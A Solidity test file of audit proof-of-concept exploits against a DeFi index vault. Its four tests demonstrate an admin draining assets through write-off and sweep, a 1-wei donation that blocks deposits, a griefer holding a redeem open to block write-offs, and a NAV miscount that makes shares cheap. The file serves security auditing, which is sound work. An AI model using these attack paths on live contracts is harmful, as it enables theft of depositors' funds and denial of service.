// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {ZenoIndexVaultTest} from "./ZenoIndexVault.t.sol";
import {ZenoIndexVault} from "../src/ZenoIndexVault.sol";
import {Vault} from "../src/Vault.sol";
import {MockERC20} from "../src/mocks/MockERC20.sol";

/// Temporary audit PoCs — not part of the suite.
contract AuditPoC is ZenoIndexVaultTest {
    // H-1: super-admin alone drains every non-USDC asset of a vault, no timelock.
    function test_PoC_SuperAdminUnilateralDrain() public {
        Vault v = _createDirectVault(0, 50, 0);
        _genesis(v, 1_000_000_000);
        _depositAs(v, user, 100_000e6);
        _deployBoth(v);
        uint256 a = tokenA.balanceOf(address(v));
        uint256 b = tokenB.balanceOf(address(v));
        assertGt(a + b, 0);

        address admin = address(this);
        zenoIndexVault.setVaultOperator(0, admin, true); // make self a "manager"
        v.proposeWriteOff(assetA);
        zenoIndexVault.confirmWriteOff(0, assetA);
        zenoIndexVault.sweepWrittenOff(0, assetA, admin);
        v.proposeWriteOff(assetB);
        zenoIndexVault.confirmWriteOff(0, assetB);
        zenoIndexVault.sweepWrittenOff(0, assetB, admin);

        assertEq(tokenA.balanceOf(admin), a);
        assertEq(tokenB.balanceOf(admin), b);
        assertEq(v.totalNav(), 0);
    }

    // M-1: manager adds a registered-but-unpriced asset; anyone donates 1 wei -> deposits brick.
    function test_PoC_UnpricedAssetDonationBricksDeposits() public {
        Vault v = _createDirectVault(0, 50, 0);
        _genesis(v, 1_000_000_000);
        MockERC20 tokenC = new MockERC20("C", "C", 6);
        uint64 assetC = zenoIndexVault.createAsset(address(tokenC)); // no price set

        uint64[] memory ids = new uint64[](3);
        ids[0] = assetA; ids[1] = assetB; ids[2] = assetC;
        uint16[] memory bps = new uint16[](3);
        bps[0] = 4000; bps[1] = 4000; bps[2] = 2000;
        vm.prank(manager);
        v.setTargetAllocations(ids, bps); // accepted: no price check (createVault has one)

        _depositAs(v, user, 1_000e6); // still works while C balance is 0

        tokenC.mint(address(0xBAD), 1);
        vm.prank(address(0xBAD));
        tokenC.transfer(address(v), 1);

        usdc.mint(user, 1_000e6);
        vm.startPrank(user);
        usdc.approve(address(v), 1_000e6);
        vm.expectRevert(ZenoIndexVault.NoPrice.selector);
        v.deposit(1_000e6, 0);
        vm.stopPrank();
    }

    // M-2: any shareholder keeps a redeem open and blocks write-off forever, re-opening at will.
    function test_PoC_OpenRedeemBlocksWriteOff() public {
        Vault v = _createDirectVault(0, 50, 0);
        _genesis(v, 1_000_000_000);
        _depositAs(v, user, 100_000e6);
        _deployBoth(v);
        address griefer = address(0x6121);
        uint256 s = _depositAs(v, griefer, 10e6);

        vm.prank(griefer);
        v.requestRedeem(s / 10);

        vm.prank(manager);
        v.proposeWriteOff(assetA);
        vm.expectRevert(Vault.AssetReserved.selector);
        zenoIndexVault.confirmWriteOff(0, assetA);

        // Even after settling, the griefer re-opens in the same block.
        vm.startPrank(griefer);
        v.claimInKind();
        v.requestRedeem(s / 10);
        vm.stopPrank();
        vm.expectRevert(Vault.AssetReserved.selector);
        zenoIndexVault.confirmWriteOff(0, assetA);
    }

    // H-2 (known, still open): rebalance-sale USDC vanishes from NAV -> cheap shares.
    function test_PoC_RebalanceSaleUnderstatesNav() public {
        Vault v = _createDirectVault(0, 50, 0);
        _genesis(v, 1_000_000_000);
        _depositAs(v, user, 100_000e6);
        _deployBoth(v);
        uint256 navBefore = v.totalNav();

        uint64[] memory ids = new uint64[](2);
        ids[0] = assetA; ids[1] = assetB;
        uint16[] memory bps = new uint16[](2);
        bps[0] = 1000; bps[1] = 9000;
        vm.startPrank(manager);
        v.setTargetAllocations(ids, bps);
        v.executeRebalance(0, _pathToUsdc(address(tokenA)), 0); // sell ~50% of NAV of A
        vm.stopPrank();

        uint256 navAfter = v.totalNav();
        emit log_named_uint("NAV before", navBefore);
        emit log_named_uint("NAV after sell", navAfter);
        emit log_named_uint("USDC held, uncounted", usdc.balanceOf(address(v)));
        assertLt(navAfter * 100, navBefore * 55); // NAV reads ~half while value is ~unchanged
    }
}
